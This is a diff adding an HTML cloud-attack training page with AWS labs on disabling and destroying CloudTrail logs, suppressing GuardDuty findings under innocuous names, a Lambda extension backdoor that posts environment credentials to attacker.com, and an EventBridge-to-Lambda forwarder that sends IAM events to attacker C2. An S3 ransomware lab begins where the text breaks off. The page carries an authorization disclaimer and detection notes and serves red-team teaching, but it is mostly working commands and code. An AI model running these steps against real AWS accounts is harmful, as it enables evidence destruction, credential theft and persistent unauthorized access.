@@ -1,0 +1,804 @@
+<!-- M19: Persistence & Evasion Labs -->
+
+<!-- AUTHORIZED TESTING DISCLAIMER -->
+<div class="warning" style="margin-bottom: 1.5rem;">
+  <i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+</div>
+
+<!-- PREREQUISITES -->
+<div class="prereq">
+  <strong><i class="fa-solid fa-list-check"></i> Prerequisites (all M19 labs):</strong>
+  <ul>
+    <li>AWS CLI configured with a lab identity that has IAM, CloudTrail, GuardDuty, Lambda, EventBridge, and S3 permissions</li>
+    <li>Completed M17 (IAM Privilege Escalation) and M18 (Cloud Enumeration)</li>
+    <li>Kali Linux or macOS attacker workstation; Python 3.11+ for layer packaging</li>
+    <li>A personal attacker-controlled listener URL for exfil demonstrations (e.g., <code>https://webhook.site</code>)</li>
+  </ul>
+</div>
+
+<!-- MITRE ATT&CK MAPPINGS -->
+<div class="note" style="margin-bottom:1.5rem;">
+  <strong><i class="fa-solid fa-shield-halved"></i> MITRE ATT&CK Coverage (M19):</strong>
+  <ul>
+    <li><strong>T1562.008</strong> — Impair Defenses: Disable or Modify Cloud Logs (L01, L02)</li>
+    <li><strong>T1562.012</strong> — Impair Defenses: Disable or Modify Cloud Firewall (L02 — GuardDuty suppression)</li>
+    <li><strong>T1546</strong> — Event Triggered Execution (L03 — Lambda layer; L04 — EventBridge)</li>
+    <li><strong>T1074</strong> — Data Staged (L03 — credential exfiltration to C2)</li>
+    <li><strong>T1485</strong> — Data Destruction (L05 — S3 lifecycle ransomware)</li>
+  </ul>
+</div>
+
+<div class="lab-walkthrough-content" id="M19-L01-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Tamper with CloudTrail logging to operate undetected by stopping log collection, destroying evidence, and removing the trail configuration.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate all CloudTrail trails to identify logging configuration, destination S3 buckets, and current status.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws cloudtrail describe-trails \
+  --query 'trailList[*].[Name,S3BucketName,IsMultiRegionTrail,IsOrganizationTrail]'</div>
+            <div class="terminal-output">[
+    ["main-trail", "cloudtrail-logs-444444-us-east-1", true, true],
+    ["data-events", "cloudtrail-data-444444", false, false]
+]</div>
+            <div class="terminal-cmd">$ aws cloudtrail get-trail-status --name main-trail</div>
+            <div class="terminal-output">{
+    "IsLogging": true,
+    "LatestDeliveryTime": "2026-04-01T07:55:00Z",
+    "LatestNotificationTime": "2026-04-01T07:55:00Z"
+}</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Org-trail restriction:</strong> Organizational trails (<code>IsOrganizationTrail: true</code>) can only be deleted from the management account or a CloudTrail delegated administrator. Member accounts calling <code>delete-trail</code> against an org trail will receive <code>AccessDeniedException</code>. If you see <code>true</code> in that column, escalate to management-account access before proceeding to step 4.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Stop CloudTrail logging. This is the first step — but note that this API call itself generates a <code>StopLogging</code> event before logging ceases.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws cloudtrail stop-logging --name main-trail</div>
+            <div class="terminal-output">{ }
+# StopLogging event IS recorded — but we'll deal with that next</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Delete the S3 bucket containing all historical CloudTrail logs. This destroys the forensic evidence, including the <code>StopLogging</code> event itself.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># First empty the bucket (required before deletion)</div>
+            <div class="terminal-output">$ aws s3 rm s3://cloudtrail-logs-444444-us-east-1 --recursive
+delete: s3://cloudtrail-logs-444444-us-east-1/AWSLogs/444444444444/CloudTrail/...
+... (12,847 objects deleted)</div>
+            <div class="terminal-cmd">$ aws s3 rb s3://cloudtrail-logs-444444-us-east-1 --force</div>
+            <div class="terminal-output">remove_bucket: cloudtrail-logs-444444-us-east-1
+# All historical logs destroyed — no forensic evidence remains</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Delete the trail configuration itself. Without a trail, no new events are captured at all.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws cloudtrail delete-trail --name main-trail</div>
+            <div class="terminal-output">{ }
+# Trail deleted — no logging configuration exists</div>
+            <div class="terminal-cmd">$ aws cloudtrail describe-trails</div>
+            <div class="terminal-output">{
+    "trailList": [
+        {"Name": "data-events", "IsMultiRegionTrail": false}
+    ]
+}
+# Only the single-region data-events trail remains</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Alternative (stealthier): instead of deleting the trail, use selective event filtering to keep the trail "active" while suppressing read events. This is harder for the SOC to notice than a full trail deletion.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws cloudtrail put-event-selectors --trail-name main-trail \
+  --event-selectors '[{
+    "ReadWriteType": "WriteOnly",
+    "IncludeManagementEvents": true,
+    "ExcludeManagementEventSources": [
+      "kms.amazonaws.com",
+      "rdsdata.amazonaws.com"
+    ]
+  }]'</div>
+            <div class="terminal-output">{
+    "EventSelectors": [{
+        "ReadWriteType": "WriteOnly",
+        "IncludeManagementEvents": true
+    }]
+}
+# Read events now unlogged — attacker recon is invisible
+# Trail appears active — SOC sees normal write events</div>
+          </div>
+        </div>
+        <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Accuracy note:</strong> <code>ExcludeManagementEventSources</code> only applies to KMS and RDS Data API events — it cannot exclude arbitrary attacker API calls from CloudTrail. Using <code>ReadWriteType: WriteOnly</code> suppresses ALL read events (including legitimate operations), which will be noticed by a SOC. True evasion requires targeting the specific trail's S3 bucket or using CloudTrail Lake exclusions.</div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Stop Logging</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Delete S3 (evidence gone)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Delete Trail</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Operate undetected</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Stopping CloudTrail generates an event — but if you delete the S3 bucket first, there's nowhere for it to land. Defend against this by enabling S3 Object Lock (WORM), CloudTrail Lake, and organization-level trails that member accounts cannot modify.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L01):</strong>
+    <ul>
+      <li>CloudWatch Alarms on <code>StopLogging</code>, <code>DeleteTrail</code>, and <code>PutEventSelectors</code> API calls</li>
+      <li>AWS Config rule <code>cloud-trail-enabled</code> will fire within minutes of trail deletion</li>
+      <li>Security Hub control CT.1 monitors for at least one active multi-region trail</li>
+      <li>CloudTrail Lake is independent of trail S3 delivery — deleting the S3 bucket does not affect Lake query data</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M19-L02-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Create GuardDuty suppression filters to automatically archive security findings generated by attacker activity, keeping the SOC blind.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List GuardDuty detectors in the account. Every region can have its own detector — target the primary region first.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws guardduty list-detectors</div>
+            <div class="terminal-output">{
+    "DetectorIds": ["a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"]
+}</div>
+            <div class="terminal-cmd">$ aws guardduty get-detector --detector-id a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6</div>
+            <div class="terminal-output">{
+    "Status": "ENABLED",
+    "FindingPublishingFrequency": "FIFTEEN_MINUTES",
+    "DataSources": {
+        "CloudTrail": {"Status": "ENABLED"},
+        "S3Logs": {"Status": "ENABLED"},
+        "Kubernetes": {"Status": "ENABLED"}
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create a suppression filter that auto-archives any finding associated with the attacker's access key. Name it innocuously to avoid suspicion during audits.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws guardduty create-filter \
+  --detector-id a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 \
+  --name "Internal-Scanner-Whitelist" \
+  --description "Suppress findings from approved internal security scanning tools" \
+  --finding-criteria '{
+    "Criterion": {
+      "resource.accessKeyDetails.accessKeyId": {
+        "Eq": ["AKIAXXXXXXXXXXXXXXXX"]
+      }
+    }
+  }' \
+  --action ARCHIVE</div>
+            <div class="terminal-output">{
+    "Name": "Internal-Scanner-Whitelist"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Create additional suppression filters by source IP, finding type, or resource ARN for broader coverage. Layer multiple filters for defense-in-depth (from the attacker's perspective).</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws guardduty create-filter \
+  --detector-id a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 \
+  --name "Pen-Test-Exception" \
+  --description "Suppress findings from authorized penetration testing IPs" \
+  --finding-criteria '{
+    "Criterion": {
+      "service.action.networkConnectionAction.remoteIpDetails.ipAddressV4": {
+        "Eq": ["203.0.113.50", "198.51.100.25"]
+      }
+    }
+  }' \
+  --action ARCHIVE</div>
+            <div class="terminal-output">{
+    "Name": "Pen-Test-Exception"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the suppression works by triggering a finding (e.g., recon API calls from the attacker's access key) and confirming it gets auto-archived instead of alerting the SOC.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Trigger recon activity that would normally generate a finding</div>
+            <div class="terminal-output">$ aws iam list-users
+$ aws s3 ls
+$ aws ec2 describe-instances --region us-east-1
+$ aws lambda list-functions</div>
+            <div class="terminal-cmd"># Check findings — should be auto-archived, not active</div>
+            <div class="terminal-output">$ aws guardduty list-findings \
+  --detector-id a1b2... \
+  --finding-criteria '{"Criterion":{"service.archived":{"Eq":["true"]}}}'
+→ Finding "Recon:IAMUser/MaliciousIPCaller" — Status: ARCHIVED ✓
+→ Finding "Discovery:S3/MaliciousIPCaller" — Status: ARCHIVED ✓</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Operate freely. All GuardDuty findings matching your access key or source IP are automatically suppressed. The SOC dashboard remains clean.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># SOC GuardDuty dashboard:</div>
+            <div class="terminal-output">Active findings: 0
+Archived findings: 14  (hidden in the archive — rarely checked)
+
+# Attacker has been operating for 3 weeks undetected
+# 14 findings auto-archived — zero SOC alerts triggered</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">List detectors</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Create suppression filter</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Findings auto-archived</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Operate freely</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Name filters innocuously: "Internal-Scanner-Whitelist", "Pen-Test-Exception", "VPN-Egress-Allowlist". They auto-archive findings without alerting the SOC. Defend by monitoring <code>guardduty:CreateFilter</code> API calls and reviewing filter lists regularly.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L02):</strong>
+    <ul>
+      <li>CloudTrail: alert on <code>guardduty:CreateFilter</code> and <code>guardduty:UpdateFilter</code></li>
+      <li>Review all GuardDuty filters during incident response — suppress filters with <code>ARCHIVE</code> action are the key indicator</li>
+      <li>GuardDuty delegated admin (in AWS Organizations) can see filters created in member accounts</li>
+      <li>Security Hub aggregates findings across regions — check it separately from per-region GuardDuty consoles</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M19-L03-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Create a malicious Lambda Extension layer that exfiltrates credentials on every function invocation — persisting even through code redeployments.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Create the backdoor Lambda Extension. Unlike Python modules in the <code>python/</code> directory — which only execute if explicitly imported by the function handler — an executable in the <code>extensions/</code> directory runs independently as an external extension on every cold start and warm invocation.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">mkdir -p layer-pkg/extensions
+cat > layer-pkg/extensions/backdoor-ext &lt;&lt;'EOF'
+#!/bin/bash
+# Lambda extension main loop — runs independently of function handler
+RUNTIME_API="${AWS_LAMBDA_RUNTIME_API}"
+
+# Register as an external extension
+curl -sX POST "http://${RUNTIME_API}/2020-01-01/extension/register" \
+  --header "Lambda-Extension-Name: backdoor-ext" \
+  -d '{"events": ["INVOKE", "SHUTDOWN"]}'
+
+# Exfil env vars on first cold start
+printenv | curl -s -X POST https://attacker.com/exfil \
+  -H "Content-Type: text/plain" --data-binary @-
+
+# Extension event loop
+while true; do
+  NEXT=$(curl -sX GET "http://${RUNTIME_API}/2020-01-01/extension/event/next" \
+    --header "Lambda-Extension-Identifier: $(cat /tmp/ext-id)")
+  echo "$NEXT" | grep -q "SHUTDOWN" &amp;&amp; exit 0
+done
+EOF
+chmod +x layer-pkg/extensions/backdoor-ext</div>
+            <div class="terminal-output"># extensions/ directory created — backdoor-ext is executable</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Why Extensions, not Python modules:</strong> Lambda Extensions (<code>extensions/</code> directory) execute independently of the function handler on each cold start and warm invocation — unlike Python modules in <code>python/</code>, which only execute if explicitly imported by the function code. A Python file dropped into <code>python/</code> does nothing unless the function handler imports it, making it an unreliable persistence mechanism.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Package only the <code>extensions/</code> directory into the layer zip and publish it with an innocuous name that resembles a legitimate dependency patch.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">cd layer-pkg &amp;&amp; zip -r ../backdoor-layer.zip extensions/</div>
+            <div class="terminal-output">  adding: extensions/ (stored 0%)
+  adding: extensions/backdoor-ext (deflated 52%)</div>
+            <div class="terminal-cmd">$ aws lambda publish-layer-version \
+  --layer-name boto3-patch \
+  --description "Boto3 compatibility patch for Python 3.12" \
+  --zip-file fileb://backdoor-layer.zip \
+  --compatible-runtimes python3.11 python3.12 python3.13</div>
+            <div class="terminal-output">{
+    "LayerVersionArn": "arn:aws:lambda:us-east-1:444444444444:layer:boto3-patch:1",
+    "Version": 1,
+    "Description": "Boto3 compatibility patch for Python 3.12",
+    "CompatibleRuntimes": ["python3.11", "python3.12", "python3.13"]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Attach the backdoor layer to target Lambda functions. The extension registers with the Lambda runtime API and runs its event loop independently of the function handler.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws lambda update-function-configuration \
+  --function-name production-api-handler \
+  --layers arn:aws:lambda:us-east-1:444444444444:layer:boto3-patch:1</div>
+            <div class="terminal-output">{
+    "FunctionName": "production-api-handler",
+    "Layers": [
+        {
+            "Arn": "arn:aws:lambda:us-east-1:444444444444:layer:boto3-patch:1",
+            "CodeSize": 482
+        }
+    ],
+    "LastModified": "2026-04-01T09:00:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Every cold start now phones home with the function's temporary AWS credentials via the extension. These creds have whatever permissions the Lambda execution role grants.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Attacker listener receives on each cold start:</div>
+            <div class="terminal-output">POST /exfil
+AWS_LAMBDA_FUNCTION_NAME=production-api-handler
+AWS_ACCESS_KEY_ID=ASIAQWERTYUIOP54321
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MD...
+AWS_SESSION_TOKEN=FwoGZXIvYXdzEBYaDHx2bG1vbW5uZm5...
+AWS_REGION=us-east-1
+
+# Creds valid for ~6 hours — new ones sent on every cold start
+# Attacker always has fresh credentials</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">The backdoor survives function code redeployments. Layers persist independently of function code — developers can update their code 100 times and the layer backdoor remains attached.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Developer deploys new code (unaware of backdoor layer):</div>
+            <div class="terminal-output">$ aws lambda update-function-code \
+  --function-name production-api-handler \
+  --zip-file fileb://new-release-v2.5.zip
+
+# Layer configuration is UNCHANGED — backdoor persists
+$ aws lambda get-function-configuration --function-name production-api-handler \
+  --query 'Layers'
+[{"Arn": "arn:aws:lambda:...:layer:boto3-patch:1"}]  &larr; Still attached</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Create backdoor extension layer</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Attach to functions</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Every invocation exfils creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Survives redeploy</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Lambda layers are a powerful persistence mechanism because they're decoupled from function code. Audit layers attached to functions, verify layer content hashes, and use AWS Config rules to detect unauthorized layer modifications.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L03):</strong>
+    <ul>
+      <li>CloudTrail: <code>lambda:PublishLayerVersion</code> followed by <code>lambda:UpdateFunctionConfiguration</code> from an unexpected identity is a high-signal indicator</li>
+      <li>Inspect the layer zip: external extensions must be executable files in the <code>extensions/</code> subdirectory — any executable there warrants review</li>
+      <li>Runtime: unusual outbound connections from Lambda execution environments (visible in VPC Flow Logs if the function is VPC-attached)</li>
+      <li>AWS Config: custom rule to alert on functions with layers from accounts other than your own account or approved vendors</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M19-L04-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Establish persistence by creating an EventBridge rule that monitors IAM events and notifies the attacker of credential rotations, enabling instant re-compromise.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Create an EventBridge rule that matches IAM API calls captured via CloudTrail. IAM does not publish directly to EventBridge — all IAM events arrive as CloudTrail records with <code>source: aws.cloudtrail</code> and <code>eventSource: iam.amazonaws.com</code> in the detail object.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat pattern.json</div>
+            <div class="terminal-output">{
+  "source": ["aws.cloudtrail"],
+  "detail-type": ["AWS API Call via CloudTrail"],
+  "detail": {
+    "eventSource": ["iam.amazonaws.com"],
+    "eventName": [
+      "CreateAccessKey", "DeleteAccessKey",
+      "CreateUser", "DeleteUser",
+      "AttachUserPolicy", "DetachUserPolicy",
+      "CreateRole", "UpdateAssumeRolePolicy",
+      "PutUserPolicy", "DeleteUserPolicy"
+    ]
+  }
+}</div>
+            <div class="terminal-cmd">$ aws events put-rule \
+  --name IAMProtectPersistence \
+  --event-pattern file://pattern.json \
+  --state ENABLED \
+  --region us-east-1</div>
+            <div class="terminal-output">{
+    "RuleArn": "arn:aws:events:us-east-1:444444444444:rule/IAMProtectPersistence"
+}</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Common error — wrong source field:</strong> The IAM service does not publish directly to EventBridge. All IAM API call events arrive via CloudTrail with <code>"source": ["aws.cloudtrail"]</code> and <code>"eventSource": ["iam.amazonaws.com"]</code> in the detail object. Using <code>"source": ["aws.iam"]</code> will create a syntactically valid rule that matches zero events — a very easy mistake to miss during lab testing.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create a Lambda function that forwards captured IAM events to the attacker's C2 infrastructure. Use an innocuous name and description.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat exfil_handler.py</div>
+            <div class="terminal-output">import json
+import urllib.request
+
+def handler(event, context):
+    """Forward IAM events to C2"""
+    data = json.dumps({
+        "event": event.get("detail", {}).get("eventName"),
+        "user": event.get("detail", {}).get("userIdentity", {}).get("arn"),
+        "params": event.get("detail", {}).get("requestParameters"),
+        "time": event.get("detail", {}).get("eventTime"),
+        "source_ip": event.get("detail", {}).get("sourceIPAddress")
+    }).encode()
+
+    req = urllib.request.Request(
+        "https://attacker.com/iam-events",
+        data=data,
+        headers={"Content-Type": "application/json"}
+    )
+    urllib.request.urlopen(req, timeout=5)
+    return {"status": "processed"}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Set the exfil Lambda as the target for the EventBridge rule. Grant EventBridge permission to invoke the function.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws events put-targets \
+  --rule "IAMProtectPersistence" \
+  --targets '[{
+    "Id": "1",
+    "Arn": "arn:aws:lambda:us-east-1:444444444444:function:iam-compliance-forwarder"
+  }]'</div>
+            <div class="terminal-output">{
+    "FailedEntryCount": 0,
+    "FailedEntries": []
+}</div>
+            <div class="terminal-cmd">$ aws lambda add-permission \
+  --function-name iam-compliance-forwarder \
+  --statement-id eventbridge-invoke \
+  --action lambda:InvokeFunction \
+  --principal events.amazonaws.com \
+  --source-arn arn:aws:events:us-east-1:444444444444:rule/IAMProtectPersistence</div>
+            <div class="terminal-output">{ "Statement": "..." }</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Now all IAM API calls trigger a real-time notification to the attacker. When defenders rotate credentials or create new access keys, the attacker knows immediately.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Defender rotates compromised access key:</div>
+            <div class="terminal-output">$ aws iam create-access-key --user-name admin-user</div>
+            <div class="terminal-cmd"># Attacker C2 receives INSTANTLY:</div>
+            <div class="terminal-output">POST /iam-events
+{
+    "event": "CreateAccessKey",
+    "user": "arn:aws:iam::444444444444:user/security-admin",
+    "params": {
+        "userName": "admin-user"
+    },
+    "time": "2026-04-01T10:30:00Z",
+    "source_ip": "10.0.1.50"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">The attacker is now notified of every credential rotation in real-time, enabling instant re-compromise. Defenders think they've remediated — but the attacker adapts faster than they can rotate.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Attack timeline:</div>
+            <div class="terminal-output">10:30:00 — Defender creates new access key for admin-user
+10:30:01 — EventBridge fires → Lambda → C2 notified
+10:30:05 — Attacker sees notification
+10:31:00 — Attacker uses other persistence (shadow role) to steal new key
+10:31:30 — Attacker has new credentials before defender finishes rotation
+
+# Credential rotation is useless when the attacker has event monitoring</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">EventBridge Rule</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Monitors IAM events</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Triggers attacker Lambda</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Forwards to C2</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> EventBridge persistence is particularly insidious because it turns the defender's own remediation actions into intelligence for the attacker. During incident response, always audit EventBridge rules and Lambda function destinations before rotating credentials.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L04):</strong>
+    <ul>
+      <li>CloudTrail: alert on <code>events:PutRule</code> + <code>events:PutTargets</code> in the same session from an unexpected identity</li>
+      <li>Review EventBridge rules with targets pointing to Lambda functions outside of known CI/CD principals</li>
+      <li>Lambda: any function with an innocuous name but an EventBridge trigger and outbound HTTPS calls to non-AWS endpoints is suspicious</li>
+      <li>Security Hub Finding: <code>events:PutTargets</code> with a Lambda ARN not in the approved resource inventory</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M19-L05-content">
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Execute a cloud ransomware attack by suspending S3 versioning and then setting lifecycle rules to auto-delete critical data, delivering a ransom demand.</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Identify critical S3 buckets containing production data, backups, or irreplaceable assets that would cause maximum business impact if lost.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws s3 ls</div>
+            <div class="terminal-output">2025-01-15 08:00:00 critical-data-prod
+2025-03-20 12:00:00 customer-uploads-prod
+2025-06-10 09:30:00 ml-training-datasets
+2025-09-01 14:00:00 financial-reports-2025
+2025-11-15 16:00:00 database-backups-daily</div>
